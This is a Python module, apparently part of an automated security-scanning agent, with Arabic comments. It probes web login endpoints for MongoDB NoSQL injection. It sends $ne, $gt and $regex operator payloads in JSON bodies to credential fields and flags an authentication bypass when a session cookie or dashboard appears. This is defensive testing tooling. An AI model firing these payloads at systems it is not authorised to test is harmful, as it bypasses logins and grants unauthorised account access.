"""
NoSQL Injection Skill (CWE-943)
===============================
اختبار حقن NoSQL (MongoDB-focused) بإثبات تفاضلي قطعي:

- baseline: طلب بقيمة عادية (password=wrongpassword)
- probe: حقن operators مدينة ($ne, $regex, $gt) عبر جسم JSON
- Proof-of-Execution: تغيّر سلوك قطعي في الاستجابة:
    * فتح جلسة/auth (Set-Cookie session) مع $ne ولا توجد مع baseline
    * تغيّر الحالة الجوهرية: 401→200 أو ظهور dashboard/session token
- Reflection only → لا يُرفع claim
"""
from __future__ import annotations

import re
from typing import Optional, Tuple
import httpx
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from agents.skills.base_skill import BaseSkill, SkillResult

# Operator payloads تجريها كـ JSON body (الشكل الأشهر لمصادقات MongoDB)
JSON_PROBES = [
    {"param": {"$ne": None}},
    {"param": {"$ne": ""}},
    {"param": {"$gt": ""}},
    {"param": {"$regex": "^a"}},
    {"param": {"$regex": ".*"}},
]
# لو البارامتر في query string (لم بـ JSON)
QUERY_PROBES = [
    {"param[$ne]": ""},
    {"param[$gt]": ""},
    {"param[$regex]": "^a"},
]


class NoSQLInjectionSkill(BaseSkill):
    name = "nosql_injection_skill"
    vuln_type = "nosql_injection"
    cwe = "CWE-943"
    owasp_top10 = "A03:2021"
    default_severity = "Critical"

    PARAM_CANDIDATES = ("user", "username", "email", "login", "pass", "password", "q", "uid", "account")

    def __init__(self, proxy: Optional[str] = None, timeout: float = 12.0):
        super().__init__(proxy=proxy, timeout=timeout)

    async def run(self, target_url: str, param_name: str, **kwargs) -> SkillResult:
        if not any(kw in param_name.lower() for kw in self.PARAM_CANDIDATES):
            return SkillResult(
                verified=False, vuln_type=self.vuln_type,
                title="Param not a NoSQL auth candidate", severity=self.default_severity,
                endpoint=target_url, param_name=param_name, evidence="")

        async with httpx.AsyncClient(proxies=self.proxy or None, timeout=self.timeout,
                                     follow_redirects=False) as client:
            try:
                # ── Baseline: قيمة خاطئة آمنة ──
                baseline = await self._json_attempt(client, target_url, param_name, "definitely-wrong-value")
                if baseline is None or baseline[0] in (403, 429):
                    return self._no(target_url, param_name, "Baseline blocked/unavailable — cannot differential-check")

                base_status, base_body, base_auth = self._auth_signal(baseline)

                # ── Probes ──
                for spec in JSON_PROBES:
                    payload = spec["param"].copy()  # param = operator map
                    resp = await self._json_attempt(client, target_url, param_name, payload)
                    if resp is None or resp[0] in (403, 429):
                        continue

                    status, body, auth = self._auth_signal(resp)

                    # ── إثبات التنفيذ: فتح جلسة/حالة auth جديدة لم تكن في الـ baseline ──
                    if auth and not base_auth:
                        return SkillResult(
                            verified=True, vuln_type=self.vuln_type,
                            title=f"NoSQL Injection in '{param_name}' (auth bypass via {list(payload.values())[0] if isinstance(payload, dict) and list(payload.values()) else 'operator'})",
                            severity=self.default_severity,
                            endpoint=target_url, param_name=param_name,
                            payload_used=f"{param_name}={payload}",
                            evidence=(
                                f"baseline: status={baseline[0]} authenticated={base_auth} ; "
                                f"probe: status={status} authenticated={auth} "
                                f"(session cookie appeared) — differential confirmed"),
                            confidence=0.92,
                            tool=self.name,
                            evidence_sources=["NoSQLInjectionSkill/DifferentialAuth"])

                    # إثبات بديل: تغيّر قطعي في الحالة + ينقص حجم body بشكل جوهري (login form اختفى)
                    if status != base_status and (auth or self._is_dashboard_response(body)):
                        return SkillResult(
                            verified=True, vuln_type=self.vuln_type,
                            title=f"NoSQL Injection in '{param_name}' (state transition {base_status}->{status} via operator)",
                            severity=self.default_severity,
                            endpoint=target_url, param_name=param_name,
                            payload_used=f"{param_name}={payload}",
                            evidence=f"baseline_status={base_status}, probe_status={status}, authenticated={auth}",
                            confidence=0.88,
                            tool=self.name,
                            evidence_sources=["NoSQLInjectionSkill/StateDifferential"])
            except Exception as e:
                return self._no(target_url, param_name, str(e))

        return self._no(target_url, param_name, "No differential auth-behavior change under any NoSQL operator")

    # ─── Execution helpers ─────────────────────────────────────────────────

    async def _json_attempt(self, client: httpx.AsyncClient, target_url: str,
                            param_name: str, value) -> Optional[Tuple[int, str, bool]]:
        """
        يجرّب POST JSON body مع قيمة حقن — يشمل الـ operator payloads
        value: str (baseline) | dict ({'$ne': None} أو أي operator-set)
        يعيد (status, body, has_session_cookie)
        """
        payload_value = value if isinstance(value, str) else value
        # حالة str: baseline — القيمة نصية
        # حالة dict: أول حقل operator — {"$ne": None}
        try:
            body_json = {param_name: payload_value}
            resp = await client.post(target_url, json=body_json)
            return resp.status_code, resp.text, self._session_cookie(resp)
        except Exception:
            return None

    async def _query_attempt(self, client: httpx.AsyncClient, target_url: str,
                             param_name: str, value: str) -> Optional[Tuple[int, str, bool]]:
        try:
            parsed = urlparse(target_url)
            qs = parse_qs(parsed.query)
            qs[param_name] = [value]
            new_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
            resp = await client.get(new_url)
            return resp.status_code, resp.text, self._session_cookie(resp)
        except Exception:
            return None

    def _session_cookie(self, resp: httpx.Response) -> bool:
        for sc_name in ("session", "sid", "sessionid", "token", "auth", "connect.sid", "jwt"):
            for v in resp.headers.get_list("set-cookie") if hasattr(resp.headers, "get_list") else ([resp.headers.get("set-cookie", "")] if resp.headers.get("set-cookie") else []):
                if sc_name in v.lower():
                    return True
        return False

    def _auth_signal(self, pack: Tuple[int, str, bool]) -> Tuple[int, str, bool]:
        status, body, cookie_auth = pack
        # Auth Signal مركّبة: cookie OR functional response patterns
        body_auth = bool(
            re.search(r"dashboard|admin|account|welcome", body[:6000], re.I)
            and re.search(r"login|password", body[:3000], re.I) is None
        ) if body else False
        return status, body, cookie_auth or body_auth

    def _is_dashboard_response(self, body: str) -> bool:
        return bool(re.search(r"dashboard|admin|account|profile", body[:6000], re.I))

    def _no(self, target_url: str, param_name: str, evidence: str = "") -> SkillResult:
        return SkillResult(
            verified=False, vuln_type=self.vuln_type,
            title="NoSQL injection not verified (no differential auth evidence)",
            severity=self.default_severity,
            endpoint=target_url, param_name=param_name, evidence=evidence)

    def can_handle(self, param_name: str, url: str = "", sample_value: str = "") -> float:
        p = param_name.lower()
        if "user" in p or "email" in p or ("login" in p) or ("pass" in p):
            return 0.85
        if "q" == p or "search" in p:
            return 0.4
        return 0.05
